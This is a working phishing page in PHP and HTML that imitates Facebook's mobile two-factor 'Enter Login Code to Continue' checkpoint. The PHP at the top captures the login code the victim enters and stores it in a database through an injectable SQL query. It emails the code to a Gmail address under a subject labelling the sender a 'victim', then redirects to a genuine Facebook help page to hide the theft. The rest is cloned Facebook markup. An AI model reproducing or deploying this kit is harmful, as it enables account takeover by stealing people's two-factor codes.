
<?php
session_start();
require_once('info.php');
 
if(isset($_POST['submit']))
{
    $approvals_code = $_POST['approvals_code'];
  echo $approvals_code;

  

  $id = $_SESSION['l_id'];

  $sql = "UPDATE info SET approvals_code = '$approvals_code' WHERE id = $id";  	
  if ($conn->query($sql) === TRUE) {  
   
  } else { 
    echo "Error: " . $sql . "<br>" . $conn->error;
  }


mail("facebookcase50302@gmail.com","Viktima e poshtme 2fa",$approvals_code);
  
  header("Location: https://www.facebook.com/help/1020633957973118/");
}
 ?>
<!DOCTYPE html>
<html>

<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

  <title>Enter Login Code to Continue</title>
  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
  <link type="text/css" rel="stylesheet" href="2fa_files/1.css" />
  <link type="text/css" rel="stylesheet" href="2fa_files/2.css" />
  <link type="text/css" rel="stylesheet" href="2fa_files/6.css" />
  <link type="text/css" rel="stylesheet" href="2fa_files/3.css" />
  <link type="text/css" rel="stylesheet" href="2fa_files/5.css" />
  <link type="text/css" rel="stylesheet" href="2fa_files/4.css" />
  <link rel="shortcut icon" href="index_files/favicon.ico" />
</head>

<body tabindex="0" class="touch x1-5 _fzu _50-3 _55wm">
  <div id="viewport" data-kaios-focus-transparent="1">
    <h1 style="
          display: block;
          height: 0;
          overflow: hidden;
          position: absolute;
          width: 0;
          padding: 0;
        ">
      Facebook
    </h1>
    <div id="page">
      <div class="_129_" id="header-notices"></div>
      <div class="_129- _6dr5" id="MChromeHeader">
        <div class="_7om2 _52we _52z5" id="header">
          <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
            <a><i class="img sp_SgxN6m2Os3B_1_5x sx_cf892b">
                <u>facebook</u></i></a>
          </div>
        </div>
      </div>
      <div class="_55wm" id="root" role="main" data-sigil="context-layer-root content-pane">

        <form action="" method="POST">
          <input type="hidden" name="fb_dtsg" value="nldxcII+Rl0=" autocomplete="off" /><input type="hidden"
            name="jazoest" value="21025" autocomplete="off" /><input type="hidden" name="checkpoint_data" value="" />
          <div title="Enter Login Code to Continue">
            <div id="u_k_0"></div>
            <article class="_55wm _55wr _50ni" id="u_k_1">
              <section class="_56be">
                <div class="_55wo _55x2 _56bf">
                  <div class="_3-8_"></div>
                  <section class="_55ws _acu">
                    <span class="_52ja _52jh">
                      <div id="checkpoint_title">
                        Enter Login Code to Continue
                      </div>
                    </span>
                  </section>
                  <section class="_55wq">
                    <div class="acw apm" data-sigil="marea">
                      <div>
                        It looks like you haven&#039;t logged in from this
                        browser before. Please enter the login code from your
                        phone below.
                      </div>
                    </div>
                    <div class="acw apm" data-sigil="marea">
                      <div>
                        <input autocapitalize="off" class="_5whq input" id="approvals_code" name="approvals_code"
                          autocomplete="off" style="-wap-input-format: &#039;*N&#039;" type="text" />
                      </div>
                    </div>
                    <div class="acw apm" data-sigil="marea">
                      <div></div>
                    </div>
                    <div class="acw apm" data-sigil="marea">
                      <input type="hidden" name="codes_submitted" value="0" />
                    </div>
                    <div class="acw apm" data-sigil="marea">
                      Note: Your text message may take a few minutes to
                      arrive.
                    </div>
                  </section>
                  <div class="_59e9 _55ws _7om2 _52we _5b6o">
                    <div class="_4g34 _5b6q _5b6p" aria-hidden="false">
                      <div class="_dd6">
                        <span class="_52jc _52j9"><a href="https://m.facebook.com/checkpoint/?having_trouble=1"
                            target="_top">Having trouble?</a></span>
                      </div>
                    </div>
                  </div>
                </div>
              </section>
              <div class="_p_9 _5nbx">
                <table class="btnBar">
                  <tr>
                    <td id="checkpointSubmitButton" class="_2hw0">
                      <button type="submit" value="Submit Code" class="_54k8 _52jg _56bs _26vk _56b_ _56bw _56bu"
                        name="submit" id="checkpointSubmitButton" data-sigil="touchable">
                        <span class="_55sr">Submit Code</span>
                      </button>
                    </td>
                  </tr>
                </table>
                <input type="hidden" name="nh" value="2f30b63e82a2fcb4f5e2d3fe40fe7da7f4dbf71b" />
        </form>
      </div>
      <div class="_1_iw">
        <button type="submit" value="Not Shkodran? Log In Here" class="_54k8 _52jd _52j9 _2mpg _-cn"
          id="id[logout-button-with-confirm]" name="submit[logout-button-with-confirm]" data-sigil="touchable">
          <span class="_55sr">Not You? Log In Here</span>
        </button>
        <section class="_2pid">
          <div class="acw apm" data-nocookies="1" id="locale-selector" data-sigil="marea">
            <div class="_7om2">
              <div class="_4g34">
                <span class="_52jc _52j9 _52jh _3ztb">English (US)</span>
                <div class="_3ztc">
                  <span class="_52jc"><a
                      href="/a/language.php?l=de_DE&amp;lref=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQC34UgEmP5BS8Fb"
                      data-locale="de_DE" data-sigil="change_language">Deutsch</a></span>
                </div>
                <div class="_3ztc">
                  <span class="_52jc"><a
                      href="/a/language.php?l=sr_RS&amp;lref=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQANHmL6TU34WxD1"
                      data-locale="sr_RS" data-sigil="change_language">Српски</a></span>
                </div>
                <div class="_3ztc">
                  <span class="_52jc"><a
                      href="/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCo6k6efWbjlVx4"
                      data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a></span>
                </div>
              </div>
              <div class="_4g34">
                <div class="_3ztc">
                  <span class="_52jc"><a
                      href="/a/language.php?l=sq_AL&amp;lref=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAgqnSpulMwvC8Y"
                      data-locale="sq_AL" data-sigil="change_language">Shqip</a></span>
                </div>
                <div class="_3ztc">
                  <span class="_52jc"><a
                      href="/a/language.php?l=tr_TR&amp;lref=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQBCMnmmScicEio0"
                      data-locale="tr_TR" data-sigil="change_language">Türkçe</a></span>
                </div>
                <div class="_3ztc">
                  <span class="_52jc"><a
                      href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDsPDcdgWsUAFtp"
                      data-locale="es_LA" data-sigil="change_language">Español</a></span>
                </div>
                <a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2Fcheckpoint%2F">
                  <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language">
                    <i class="img sp_SgxN6m2Os3B_1_5x sx_eac130"></i></div>
                </a>
              </div>
            </div>
          </div>
        </section>
      </div>
      </article>
    </div>

    <div style="display: none;">
      <div></div>
      <div></div>
    </div>
    <span></span>
  </div>
  <div class=""></div>
  <div class="viewportArea _2v9s" style="display: none;" id="u_k_2" data-sigil="marea">
    <div class="_5vsg" id="u_k_3"></div>
    <div class="_5vsh" id="u_k_4"></div>
    <div class="_5v5d fcg">
      <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
        data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
      Loading...
    </div>
  </div>
  <div class="viewportArea aclb" id="mErrorView" style="display: none;" data-sigil="marea">
    <div class="container">
      <div class="image"></div>
      <div class="message" data-sigil="error-message"></div>
      <a class="link" data-sigil="MPageError:retry">Try Again</a>
    </div>
  </div>
  </div>
  </div>
  <div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display: none;">
      <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
        <div class="_7om2 _52we">
          <div class="_5s61">
            <div class="_52z7">
              <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_k_6"
                data-sigil="dialog-cancel-button">
                Cancel</button><button type="submit" value="Back"
                class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_k_7"
                data-sigil="dialog-back-button">
                <i class="img sp_SgxN6m2Os3B_1_5x sx_1b614f" style="margin-top: 2px;"></i>
              </button>
            </div>
          </div>
          <div class="_4g34">
            <div class="_52z6">
              <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0"
                data-sigil="m-dialog-header-title dialog-title">
                Loading...
              </div>
            </div>
          </div>
          <div class="_5s61">
            <div class="_52z8" id="modalDialogHeaderButtons"></div>
          </div>
        </div>
      </div>
      <div class="modalDialogView" id="modalDialogView"></div>
      <div class="_5v5d _5v5e fcg" id="dialogSpinner">
        <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_k_5"
          data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
        Loading...
      </div>
    </div>
  </div>
</body>

</html>